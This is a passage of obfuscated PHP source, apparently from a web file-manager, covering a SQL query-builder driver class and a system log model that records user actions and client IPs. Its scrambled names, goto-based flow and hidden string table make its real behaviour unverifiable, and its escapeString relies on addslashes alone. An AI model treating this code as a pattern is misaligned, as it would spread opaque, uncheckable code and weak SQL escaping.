preg_replace($Dö˜Ÿ›‡‘„[958], think_config($Dö˜Ÿ›‡‘„[864]) . $Dö˜Ÿ›‡‘„[959], $FÅÙéËÀ®); return $FÅÙéËÀ®; } protected function parseOrder($b»Ñ‹÷à») { $C‘À™Ş‚ =& $_SERVER[Â€Á›¨õ]; if (is_array($b»Ñ‹÷à»)) { $eê½ÓÇ¯ = array(); foreach ($b»Ñ‹÷à» as $f„ë•º…Ë => $Bß–Äáª) { if (is_numeric($f„ë•º…Ë)) { $eê½ÓÇ¯[] = $this->parseKey($Bß–Äáª); } else { $Bß–Äáª = in_array(strtoupper(trim($Bß–Äáª)), array($C‘À™Ş‚[960], $C‘À™Ş‚[961])) ? $C‘À™Ş‚[50] . $Bß–Äáª : $C‘À™Ş‚[33]; if (preg_match($C‘À™Ş‚[962], $f„ë•º…Ë)) { $eê½ÓÇ¯[] = $this->parseKey($f„ë•º…Ë) . $Bß–Äáª; } else { think_exception($C‘À™Ş‚[963] . $f„ë•º…Ë); } } } $b»Ñ‹÷à» = implode($C‘À™Ş‚[47], $eê½ÓÇ¯); } return !empty($b»Ñ‹÷à») ? $C‘À™Ş‚[964] . $b»Ñ‹÷à» : $C‘À™Ş‚[33]; } protected function parseGroup($fÉÚ“‘†â™) { $AøÄ«ÌœŞ¹ =& $_SERVER[Â€Á›¨õ]; return !empty($fÉÚ“‘†â™) ? $AøÄ«ÌœŞ¹[965] . $fÉÚ“‘†â™ : $AøÄ«ÌœŞ¹[33]; } protected function parseHaving($dƒ…¬áíÉí) { $eÚË›õÉğÏ =& $_SERVER[Â€Á›¨õ]; return !empty($dƒ…¬áíÉí) ? $eÚË›õÉğÏ[966] . $dƒ…¬áíÉí : $eÚË›õÉğÏ[33]; } protected function parseComment($EĞ”ØÁä´) { $cÏ™è‚İƒÁ =& $_SERVER[Â€Á›¨õ]; return !empty($EĞ”ØÁä´) ? $cÏ™è‚İƒÁ[967] . $EĞ”ØÁä´ . $cÏ™è‚İƒÁ[968] : $cÏ™è‚İƒÁ[33]; } protected function parseDistinct($añ¬ÙÔç¸Ş) { $bæ»ŸêÅ¼Œ =& $_SERVER[Â€Á›¨õ]; return !empty($añ¬ÙÔç¸Ş) ? $bæ»ŸêÅ¼Œ[969] : $bæ»ŸêÅ¼Œ[33]; } protected function parseUnion($bÂ•á…Éé•) { $cíĞ¨¸İô =& $_SERVER[Â€Á›¨õ]; if (empty($bÂ•á…Éé•)) { return $cíĞ¨¸İô[33]; } if (isset($bÂ•á…Éé•[$cíĞ¨¸İô[344]])) { $FÎİ²ªçƒÒ = $cíĞ¨¸İô[970]; unset($bÂ•á…Éé•[$cíĞ¨¸İô[344]]); } else { $FÎİ²ªçƒÒ = $cíĞ¨¸İô[971]; } foreach ($bÂ•á…Éé• as $C×¨É•¯®Â) { $BÔÑæ‰‰Ÿæ[] = $FÎİ²ªçƒÒ . (is_array($C×¨É•¯®Â) ? $this->buildSelectSql($C×¨É•¯®Â) : $C×¨É•¯®Â); } return implode($cíĞ¨¸İô[50], $BÔÑæ‰‰Ÿæ); } public function insert($B¼·Ÿñ×§’, $f¡•Ğ§ ¡ì = array(), $E—®›ù¥Î = false) { goto e»¬ÄòàÛ¼; e»¬ÄòàÛ¼: $cï¬÷öğ´ =& $_SERVER[Â€Á›¨õ]; $bÈê©«Šï× = $F„§‹õíÅä = array(); $this->model = $f¡•Ğ§ ¡ì[$cï¬÷öğ´[277]]; goto a‡Ù›…õ®Õ; a‡Ù›…õ®Õ: foreach ($B¼·Ÿñ×§’ as $FĞß£‚šÇ˜ => $F´‘Û«Ò“ˆ) { if (is_array($F´‘Û«Ò“ˆ) && $cï¬÷öğ´[293] == $F´‘Û«Ò“ˆ[0]) { $F„§‹õíÅä[] = $this->parseKey($FĞß£‚šÇ˜); $bÈê©«Šï×[] = $F´‘Û«Ò“ˆ[1]; } elseif (is_scalar($F´‘Û«Ò“ˆ) || is_null($F´‘Û«Ò“ˆ)) { $F„§‹õíÅä[] = $this->parseKey($FĞß£‚šÇ˜); $bÈê©«Šï×[] = $this->parseValue($F´‘Û«Ò“ˆ); } } $B¤•âÄ‘Ûœ = ($E—®›ù¥Î ? $cï¬÷öğ´[842] : $cï¬÷öğ´[843]) . $cï¬÷öğ´[844] . $this->parseTable($f¡•Ğ§ ¡ì[$cï¬÷öğ´[275]]) . $cï¬÷öğ´[838] . implode($cï¬÷öğ´[47], $F„§‹õíÅä) . $cï¬÷öğ´[839] . implode($cï¬÷öğ´[47], $bÈê©«Šï×) . $cï¬÷öğ´[840]; $B¤•âÄ‘Ûœ .= $this->parseLock(isset($f¡•Ğ§ ¡ì[$cï¬÷öğ´[789]]) ? $f¡•Ğ§ ¡ì[$cï¬÷öğ´[789]] : !1); goto FÀ·©–º—‡; FÀ·©–º—‡: $B¤•âÄ‘Ûœ .= $this->parseComment(!empty($f¡•Ğ§ ¡ì[$cï¬÷öğ´[350]]) ? $f¡•Ğ§ ¡ì[$cï¬÷öğ´[350]] : $cï¬÷öğ´[33]); return $this->execute($B¤•âÄ‘Ûœ, $this->parseBind(!empty($f¡•Ğ§ ¡ì[$cï¬÷öğ´[281]]) ? $f¡•Ğ§ ¡ì[$cï¬÷öğ´[281]] : array())); goto C¬¬—º‡»; C¬¬—º‡»: } public function selectInsert($C¾«¹¶×ôÒ, $c½ÔòƒšÅ, $E¬Ğ¡Ä·¨ì = array()) { goto f¯—ÛßÈˆ ; EŸÂİ¾í‡¡: array_walk($C¾«¹¶×ôÒ, array($this, $føãÒ½ò¹Ê[841])); $AŸŠÂÎ£Ú× = $føãÒ½ò¹Ê[972] . $this->parseTable($c½ÔòƒšÅ) . $føãÒ½ò¹Ê[838] . implode($føãÒ½ò¹Ê[47], $C¾«¹¶×ôÒ) . $føãÒ½ò¹Ê[950]; $AŸŠÂÎ£Ú× .= $this->buildSelectSql($E¬Ğ¡Ä·¨ì); goto Dß†…°˜ºÈ; f¯—ÛßÈˆ : $føãÒ½ò¹Ê =& $_SERVER[Â€Á›¨õ]; $this->model = $E¬Ğ¡Ä·¨ì[$føãÒ½ò¹Ê[277]]; if (is_string($C¾«¹¶×ôÒ)) { $C¾«¹¶×ôÒ = explode($føãÒ½ò¹Ê[47], $C¾«¹¶×ôÒ); } goto EŸÂİ¾í‡¡; Dß†…°˜ºÈ: return $this->execute($AŸŠÂÎ£Ú×, $this->parseBind(!empty($E¬Ğ¡Ä·¨ì[$føãÒ½ò¹Ê[281]]) ? $E¬Ğ¡Ä·¨ì[$føãÒ½ò¹Ê[281]] : array())); goto Aõëë§íœ½; Aõëë§íœ½: } public function update($F¯íŒƒ¹…, $dÓâÖ‚ÃŞá) { $FĞÇï¾¢ì¦ =& $_SERVER[Â€Á›¨õ]; $this->model = $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[277]]; $Aè·’ˆ›½ = $FĞÇï¾¢ì¦[973] . $this->parseTable($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[275]]) . $this->parseSet($F¯íŒƒ¹…) . $this->parseWhere(!empty($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[271]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[271]] : $FĞÇï¾¢ì¦[33]) . $this->parseOrder(!empty($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[361]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[361]] : $FĞÇï¾¢ì¦[33]) . $this->parseLimit(!empty($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[288]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[288]] : $FĞÇï¾¢ì¦[33]) . $this->parseLock(isset($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[789]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[789]] : !1) . $this->parseComment(!empty($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[350]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[350]] : $FĞÇï¾¢ì¦[33]); return $this->execute($Aè·’ˆ›½, $this->parseBind(!empty($dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[281]]) ? $dÓâÖ‚ÃŞá[$FĞÇï¾¢ì¦[281]] : array())); } public function delete($Dô§Ô‰¬¤ = array()) { $Fõê¿ˆ‡¢ =& $_SERVER[Â€Á›¨õ]; $this->model = $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[277]]; $d ¶¬°•—Ú = $Fõê¿ˆ‡¢[974] . $this->parseTable($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[275]]) . $this->parseWhere(!empty($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[271]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[271]] : $Fõê¿ˆ‡¢[33]) . $this->parseOrder(!empty($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[361]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[361]] : $Fõê¿ˆ‡¢[33]) . $this->parseLimit(!empty($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[288]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[288]] : $Fõê¿ˆ‡¢[33]) . $this->parseLock(isset($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[789]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[789]] : !1) . $this->parseComment(!empty($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[350]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[350]] : $Fõê¿ˆ‡¢[33]); return $this->execute($d ¶¬°•—Ú, $this->parseBind(!empty($Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[281]]) ? $Dô§Ô‰¬¤[$Fõê¿ˆ‡¢[281]] : array())); } public function select($dİ·‹‚Ìñ¢ = array()) { goto b’œ‰Ïø¸Ÿ; eØ½ˆÌğ: $BÔ¥·Â¿¿ = isset($dİ·‹‚Ìñ¢[$c¹‚½Ñˆ×½[345]]) ? $dİ·‹‚Ìñ¢[$c¹‚½Ñˆ×½[345]] : !1; if ($BÔ¥·Â¿¿) { $AÕÊº®Ò‚Ñ = is_string($BÔ¥·Â¿¿[$c¹‚½Ñˆ×½[92]]) ? $BÔ¥·Â¿¿[$c¹‚½Ñˆ×½[92]] : $c¹‚½Ñˆ×½[975] . md5($A‹Ë›ãº©); $e¬›¿ñ‰ŸÙ = think_cache($AÕÊº®Ò‚Ñ, $c¹‚½Ñˆ×½[33], $BÔ¥·Â¿¿); if (!1 !== $e¬›¿ñ‰ŸÙ) { return $e¬›¿ñ‰ŸÙ; } } $D¬ëÍ¡á†¡ = $this->query($A‹Ë›ãº©, $this->parseBind(!empty($dİ·‹‚Ìñ¢[$c¹‚½Ñˆ×½[281]]) ? $dİ·‹‚Ìñ¢[$c¹‚½Ñˆ×½[281]] : array())); goto f±§‹‹Ë©Í; f±§‹‹Ë©Í: if ($BÔ¥·Â¿¿ && !1 !== $D¬ëÍ¡á†¡) { think_cache($AÕÊº®Ò‚Ñ, $D¬ëÍ¡á†¡, $BÔ¥·Â¿¿); } return $D¬ëÍ¡á†¡; goto Aäõ‚¡ÄÊî; b’œ‰Ïø¸Ÿ: $c¹‚½Ñˆ×½ =& $_SERVER[Â€Á›¨õ]; $this->model = $dİ·‹‚Ìñ¢[$c¹‚½Ñˆ×½[277]]; $A‹Ë›ãº© = $this->buildSelectSql($dİ·‹‚Ìñ¢); goto eØ½ˆÌğ; Aäõ‚¡ÄÊî: } public function buildSelectSql($E‚¿¿µ®Ğò = array()) { goto E×ï¨µ¢¥†; cÑ·à‹‰´Ã: $dàØ†Æ¯İ = $this->parseSql($this->selectSql, $E‚¿¿µ®Ğò); $dàØ†Æ¯İ .= $this->parseLock(isset($E‚¿¿µ®Ğò[$fÎëµŒçÇ[789]]) ? $E‚¿¿µ®Ğò[$fÎëµŒçÇ[789]] : !1); if (isset($B†Ï—ĞØ•ë)) { think_cache($B†Ï—ĞØ•ë, $dàØ†Æ¯İ); } goto C—Îé²Ñ»…; C—Îé²Ñ»…: return $dàØ†Æ¯İ; goto FÕ‡ö¿ÃõÓ; E×ï¨µ¢¥†: $fÎëµŒçÇ =& $_SERVER[Â€Á›¨õ]; if (isset($E‚¿¿µ®Ğò[$fÎëµŒçÇ[349]])) { if (strpos($E‚¿¿µ®Ğò[$fÎëµŒçÇ[349]], $fÎëµŒçÇ[47])) { list($fñ„ç¢š‘, $d“‡ÛÔÚŒ) = explode($fÎëµŒçÇ[47], $E‚¿¿µ®Ğò[$fÎëµŒçÇ[349]]); } else { $fñ„ç¢š‘ = $E‚¿¿µ®Ğò[$fÎëµŒçÇ[349]]; } $fñ„ç¢š‘ = $fñ„ç¢š‘ ? $fñ„ç¢š‘ : 1; $d“‡ÛÔÚŒ = isset($d“‡ÛÔÚŒ) ? $d“‡ÛÔÚŒ : (is_numeric($E‚¿¿µ®Ğò[$fÎëµŒçÇ[288]]) ? $E‚¿¿µ®Ğò[$fÎëµŒçÇ[288]] : 20); $Cë®¨ç›©Ğ = $d“‡ÛÔÚŒ * ((int) $fñ„ç¢š‘ - 1); $E‚¿¿µ®Ğò[$fÎëµŒçÇ[288]] = $Cë®¨ç›©Ğ . $fÎëµŒçÇ[47] . $d“‡ÛÔÚŒ; } if (think_config($fÎëµŒçÇ[976])) { $B†Ï—ĞØ•ë = $fÎëµŒçÇ[977] . md5(serialize($E‚¿¿µ®Ğò)); $CÂã †Ô… = think_cache($B†Ï—ĞØ•ë); if ($CÂã †Ô…) { return $CÂã †Ô…; } } goto cÑ·à‹‰´Ã; FÕ‡ö¿ÃõÓ: } public function parseSql($A¿èíÈ·é•, $B¶ÉÈ‰šÊÍ = array()) { $bÆ‡±ø¶† =& $_SERVER[Â€Á›¨õ]; $A¿èíÈ·é• = str_replace(array($bÆ‡±ø¶†[978], $bÆ‡±ø¶†[979], $bÆ‡±ø¶†[980], $bÆ‡±ø¶†[981], $bÆ‡±ø¶†[982], $bÆ‡±ø¶†[983], $bÆ‡±ø¶†[984], $bÆ‡±ø¶†[985], $bÆ‡±ø¶†[986], $bÆ‡±ø¶†[987], $bÆ‡±ø¶†[988]), array($this->parseTable("{$B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[275]]}"), $this->parseDistinct(isset($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[989]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[989]] : !1), $this->parseField(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[269]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[269]] : $bÆ‡±ø¶†[182]), $this->parseJoin(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[278]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[278]] : $bÆ‡±ø¶†[33]), $this->parseWhere(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[271]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[271]] : $bÆ‡±ø¶†[33]), $this->parseGroup(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[990]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[990]] : $bÆ‡±ø¶†[33]), $this->parseHaving(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[991]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[991]] : $bÆ‡±ø¶†[33]), $this->parseOrder(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[361]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[361]] : $bÆ‡±ø¶†[33]), $this->parseLimit(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[288]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[288]] : $bÆ‡±ø¶†[33]), $this->parseUnion(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[343]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[343]] : $bÆ‡±ø¶†[33]), $this->parseComment(!empty($B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[350]]) ? $B¶ÉÈ‰šÊÍ[$bÆ‡±ø¶†[350]] : $bÆ‡±ø¶†[33])), $A¿èíÈ·é•); return $A¿èíÈ·é•; } public function getLastSql($FæÊ°¥â™ = '') { return $FæÊ°¥â™ ? $this->modelSql[$FæÊ°¥â™] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f–´ÇÃº¯É) { return addslashes($f–´ÇÃº¯É); } public function setModel($cµ˜ÒÛ™Û) { $this->model = $cµ˜ÒÛ™Û; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F‹ªÙßÌ§‘; a¼¢ °š: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\x69\x6d\145", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\x74", "\146\165\x6e\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Bë‰“º±…ˆ =& $_SERVER[Â€Á›¨õ]; return array($Bë‰“º±…ˆ[1976] => LNG($Bë‰“º±…ˆ[1977]), $Bë‰“º±…ˆ[1978] => LNG($Bë‰“º±…ˆ[1979]), $Bë‰“º±…ˆ[1604] => LNG($Bë‰“º±…ˆ[1980]), $Bë‰“º±…ˆ[1981] => LNG($Bë‰“º±…ˆ[1982]), $Bë‰“º±…ˆ[1983] => LNG($Bë‰“º±…ˆ[1984]), $Bë‰“º±…ˆ[1985] => LNG($Bë‰“º±…ˆ[1986]), $Bë‰“º±…ˆ[1987] => LNG($Bë‰“º±…ˆ[1988]), $Bë‰“º±…ˆ[1634] => LNG($Bë‰“º±…ˆ[1988]), $Bë‰“º±…ˆ[1635] => LNG($Bë‰“º±…ˆ[1989]), $Bë‰“º±…ˆ[1990] => LNG($Bë‰“º±…ˆ[1991]), $Bë‰“º±…ˆ[1992] => LNG($Bë‰“º±…ˆ[1993]), $Bë‰“º±…ˆ[1994] => LNG($Bë‰“º±…ˆ[1995]), $Bë‰“º±…ˆ[1996] => LNG($Bë‰“º±…ˆ[1997]), $Bë‰“º±…ˆ[1632] => LNG($Bë‰“º±…ˆ[1998]), $Bë‰“º±…ˆ[1639] => LNG($Bë‰“º±…ˆ[1999]), $Bë‰“º±…ˆ[2000] => LNG($Bë‰“º±…ˆ[2001]), $Bë‰“º±…ˆ[2002] => LNG($Bë‰“º±…ˆ[2003]), $Bë‰“º±…ˆ[2004] => LNG($Bë‰“º±…ˆ[2005]), $Bë‰“º±…ˆ[2006] => LNG($Bë‰“º±…ˆ[2007]), $Bë‰“º±…ˆ[1642] => LNG($Bë‰“º±…ˆ[2008]), $Bë‰“º±…ˆ[1643] => LNG($Bë‰“º±…ˆ[2009]), $Bë‰“º±…ˆ[2010] => LNG($Bë‰“º±…ˆ[2011]), $Bë‰“º±…ˆ[2012] => LNG($Bë‰“º±…ˆ[2013]), $Bë‰“º±…ˆ[2014] => LNG($Bë‰“º±…ˆ[2015]), $Bë‰“º±…ˆ[1637] => LNG($Bë‰“º±…ˆ[2016]), $Bë‰“º±…ˆ[2017] => LNG($Bë‰“º±…ˆ[2018]), $Bë‰“º±…ˆ[1636] => LNG($Bë‰“º±…ˆ[2019]), $Bë‰“º±…ˆ[2020] => LNG($Bë‰“º±…ˆ[2021]), $Bë‰“º±…ˆ[2022] => LNG($Bë‰“º±…ˆ[2023]), $Bë‰“º±…ˆ[2024] => LNG($Bë‰“º±…ˆ[2024]), $Bë‰“º±…ˆ[2025] => LNG($Bë‰“º±…ˆ[2025]), $Bë‰“º±…ˆ[2026] => LNG($Bë‰“º±…ˆ[1608]), $Bë‰“º±…ˆ[2027] => LNG($Bë‰“º±…ˆ[2028]), $Bë‰“º±…ˆ[2029] => LNG($Bë‰“º±…ˆ[2030]), $Bë‰“º±…ˆ[2031] => LNG($Bë‰“º±…ˆ[2032]), $Bë‰“º±…ˆ[2033] => LNG($Bë‰“º±…ˆ[2034]), $Bë‰“º±…ˆ[2035] => LNG($Bë‰“º±…ˆ[2036]), $Bë‰“º±…ˆ[2037] => LNG($Bë‰“º±…ˆ[2037]), $Bë‰“º±…ˆ[2038] => LNG($Bë‰“º±…ˆ[2039]), $Bë‰“º±…ˆ[2040] => LNG($Bë‰“º±…ˆ[2041]), $Bë‰“º±…ˆ[2042] => LNG($Bë‰“º±…ˆ[2043]), $Bë‰“º±…ˆ[2044] => LNG($Bë‰“º±…ˆ[2045]), $Bë‰“º±…ˆ[2046] => LNG($Bë‰“º±…ˆ[2047]), $Bë‰“º±…ˆ[2048] => LNG($Bë‰“º±…ˆ[2049])); } private function typeFile() { $E›®½ëŒ¬ =& $_SERVER[Â€Á›¨õ]; $D›Ê¾æËè = array($E›®½ëŒ¬[1639] => array($E›®½ëŒ¬[1640]), $E›®½ëŒ¬[1994] => array($E›®½ëŒ¬[2050]), $E›®½ëŒ¬[1996] => array($E›®½ëŒ¬[2051]), $E›®½ëŒ¬[1632] => array($E›®½ëŒ¬[1633]), $E›®½ëŒ¬[2002] => array(), $E›®½ëŒ¬[2004] => array(), $E›®½ëŒ¬[2006] => array(), $E›®½ëŒ¬[1642] => array($E›®½ëŒ¬[1644]), $E›®½ëŒ¬[1643] => array($E›®½ëŒ¬[1644]), $E›®½ëŒ¬[2010] => array($E›®½ëŒ¬[2052]), $E›®½ëŒ¬[2012] => array($E›®½ëŒ¬[2052]), $E›®½ëŒ¬[2014] => array($E›®½ëŒ¬[2053]), $E›®½ëŒ¬[2000] => array($E›®½ëŒ¬[2054]), $E›®½ëŒ¬[1637] => array($E›®½ëŒ¬[2055]), $E›®½ëŒ¬[2017] => array($E›®½ëŒ¬[2056]), $E›®½ëŒ¬[1636] => array($E›®½ëŒ¬[1638])); return $D›Ê¾æËè; } private function typeAll() { goto A¿™ŒÃêé; a‡ÎÇòçŸ¿: return $AªŠØß¿Íï; goto B»‹´”×§Á; D÷ßŸ¥Î: foreach ($D¬åÀ÷‚Ş as $f¦ŞÁõİ¦Â => $C± í¤ÒÑè) { $AªŠØß¿Íï[$C± í¤ÒÑè[0]] = $AªŠØß¿Íï[$f¦ŞÁõİ¦Â]; } $AªŠØß¿Íï[$CÆİÊˆ¥å¸[1644]] = LNG($CÆİÊˆ¥å¸[2057]); $AªŠØß¿Íï[$CÆİÊˆ¥å¸[2052]] = LNG($CÆİÊˆ¥å¸[2058]); goto a‡ÎÇòçŸ¿; A¿™ŒÃêé: $CÆİÊˆ¥å¸ =& $_SERVER[Â€Á›¨õ]; $AªŠØß¿Íï = $this->typeList; $D¬åÀ÷‚Ş = array_filter($this->typeFile()); goto D÷ßŸ¥Î; B»‹´”×§Á: } public function addLog($fäĞ”ÑìÖ, $F’èÑÙîÉ‰ = array()) { goto aŸƒ¡‰§ğ ; aŸƒ¡‰§ğ : $DºŞò¡Ö¹µ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->typeList[$fäĞ”ÑìÖ])) { return; } $B‚º²´ª“ = defined($DºŞò¡Ö¹µ[448]) && USER_ID ? USER_ID : (isset($F’èÑÙîÉ‰[$DºŞò¡Ö¹µ[1501]]) ? $F’èÑÙîÉ‰[$DºŞò¡Ö¹µ[1501]] : 0); goto f¯“§ø…ù°; EåÃìä•Ã¢: $F’èÑÙîÉ‰ = array($DºŞò¡Ö¹µ[1492] => Session::sign(), $DºŞò¡Ö¹µ[1493] => $B‚º²´ª“, $DºŞò¡Ö¹µ[29] => $fäĞ”ÑìÖ, $DºŞò¡Ö¹µ[1495] => json_encode($F’èÑÙîÉ‰)); parent::add($F’èÑÙîÉ‰); goto A¡î‡ùøºØ; f¯“§ø…ù°: if (!$B‚º²´ª“) { $B‚º²´ª“ = (int) Session::get($DºŞò¡Ö¹µ[1791]); } $E„‰÷…ÉË‡ = get_client_ip(); if (!$F’èÑÙîÉ‰ || strlen(json_encode($F’èÑÙîÉ‰)) >= 1024) { $F’èÑÙîÉ‰ = array($DºŞò¡Ö¹µ[2059] => $E„‰÷…ÉË‡); } else { if (is_array($F’èÑÙîÉ‰)) { $F’èÑÙîÉ‰[$DºŞò¡Ö¹µ[2059]] = $E„‰÷…ÉË‡; } else { $F’èÑÙîÉ‰ = array($DºŞò¡Ö¹µ[1062] => $F’èÑÙîÉ‰, $DºŞò¡Ö¹µ[2059] => $E„‰÷…ÉË‡); } } goto EåÃìä•Ã¢; A¡î‡ùøºØ: } public function remove($C²áñøÚ‡) { $this->where(array($_SERVER[Â€Á›¨õ][406] => $C²áñøÚ‡))->delete(); } private function _makeOrder($Cïƒ½ñŠœ“ = '') { goto a¨›Ò‚”æ; EìÎ†ÕîÄ: $fÙİ£¡ÓÂÀ = Input::get($B™âÎÈ—¿á[430], $B™âÎÈ—¿á[7], $B™âÎÈ—¿á[1823], array($B™âÎÈ—¿á[1747], $B™âÎÈ—¿á[424])); $fÙİ£¡ÓÂÀ = $D°¢´¶¼[$fÙİ£¡ÓÂÀ]; $Cïƒ½ñŠœ“ = $Cïƒ½ñŠœ“ . "{$B¬¾Ş­¨¥ˆ}\x20{$fÙİ£¡ÓÂÀ}"; goto F¦¯ó‡Å¤æ; a¨›Ò‚”æ: $B™âÎÈ—¿á =& $_SERVER[Â€Á›¨õ]; $B¬¾Ş­¨¥ˆ = $B™âÎÈ—¿á[192]; $D°¢´¶¼ = array($B™âÎÈ—¿á[422] => $B™âÎÈ—¿á[423], $B™âÎÈ—¿á[424] => $B™âÎÈ—¿á[425]); goto EìÎ†ÕîÄ; F¦¯ó‡Å¤æ: return $this->order($Cïƒ½ñŠœ“); goto cÎŒ ˜È‹•; cÎŒ ˜È‹•: } public function get($B­’éŠÉõˆ = '') { goto eæ˜ È‰Ç; EÄ‡öÁÔŒã: if (!empty($B­’éŠÉõˆ[$DğÈ¡İ›Ì[2059]])) { $d¤ÔëÛ‚èª[$DğÈ¡İ›Ì[425]] = array($DğÈ¡İ›Ì[378], "\45{$B­’éŠÉõˆ[$DğÈ¡İ›Ì[2059]]}\x25"); } $eé”‹£´® = $this->_makeOrder()->where($d¤ÔëÛ‚èª)->selectPage(); if (empty($eé”‹£´®[$DğÈ¡İ›Ì[365]])) { show_json(array(), !0, $eé”‹£´®[$DğÈ¡İ›Ì[362]]); } goto A°Ÿ—‡à•Ô; D•è–³µİ: if ($B­’éŠÉõˆ[$DğÈ¡İ›Ì[1501]]) { $d¤ÔëÛ‚èª[$DğÈ¡İ›Ì[1501]] = $B­’éŠÉõˆ[$DğÈ¡İ›Ì[1501]]; } if (isset($B­’éŠÉõˆ[$DğÈ¡İ›Ì[715]])) { $A§®Ïˆ—ã = $B­’éŠÉõˆ[$DğÈ¡İ›Ì[715]]; $fŸé—Áñ¼Š = isset($B­’éŠÉõˆ[$DğÈ¡İ›Ì[470]]) ? $B­’éŠÉõˆ[$DğÈ¡İ›Ì[470]] : time(); $d¤ÔëÛ‚èª[$DğÈ¡İ›Ì[192]] = array($DğÈ¡İ›Ì[329], array($A§®Ïˆ—ã, $fŸé—Áñ¼Š)); } if ($B­’éŠÉõˆ[$DğÈ¡İ›Ì[29]]) { $DĞ¥ºù˜Òç = explode($DğÈ¡İ›Ì[47], $B­’éŠÉõˆ[$DğÈ¡İ›Ì[29]]); $BÂÀˆŒÈÓ = $this->typeFile(); $EÀ“‹Ó¬ = array(); foreach ($DĞ¥ºù˜Òç as $AÂÈ¦İÁ¼ï) { $EÀ“‹Ó¬[] = $AÂÈ¦İÁ¼ï; if (isset($BÂÀˆŒÈÓ[$AÂÈ¦İÁ¼ï])) { $EÀ“‹Ó¬ = array_merge($EÀ“‹Ó¬, $BÂÀˆŒÈÓ[$AÂÈ¦İÁ¼ï]); } } $EÀ“‹Ó¬ = array_unique($EÀ“‹Ó¬); if ($EÀ“‹Ó¬) { $d¤ÔëÛ‚èª[$DğÈ¡İ›Ì[29]] = array($DğÈ¡İ›Ì[7], $EÀ“‹Ó¬); } } goto EÄ‡öÁÔŒã; eæ˜ È‰Ç: $DğÈ¡İ›Ì =& $_SERVER[Â€Á›¨õ]; if (!$B­’éŠÉõˆ) { show_json(array()); } $d¤ÔëÛ‚èª = array(); goto D•è–³µİ; A°Ÿ—‡à•Ô: $eé”‹£´®[$DğÈ¡İ›Ì[365]] = $this->logList($eé”‹£´®[$DğÈ¡İ›Ì[365]]); return $eé”‹£´®; goto eÌ¦å¼‹çÑ; eÌ¦å¼‹çÑ: } private function ipAddress(&$f¬–‘®Õ¡ï) { $DÒóÆ«óÑŞ =& $_SERVER[Â€Á›¨õ]; if (!empty($f¬–‘®Õ¡ï[$DÒóÆ«óÑŞ[2059]])) { $C³“½›ö‰™ = IpLocation::get($f¬–‘®Õ¡ï[$DÒóÆ«óÑŞ[2059]]); } else { $C³“½›ö‰™ = LNG($DÒóÆ«óÑŞ[2060]); } $f¬–‘®Õ¡ï[$DÒóÆ«óÑŞ[2061]] = $C³“½›ö‰™; } private function descZipDownload($F˜ÏÕ«¡¥ò, &$b†ÚŞ¨ÜÈ) { $a íêî¶£¹ =& $_SERVER[Â€Á›¨õ]; if (!isset($F˜ÏÕ«¡¥ò[$a íêî¶£¹[2062]])) { return; } $FîÙÛ±… = json_decode($F˜ÏÕ«¡¥ò[$a íêî¶£¹[2062]], !0); foreach ($FîÙÛ±… as $A‡›†¥„İè) { try { $bÂè¼áéÖ = IO::infoFull($A‡›†¥„İè[$a 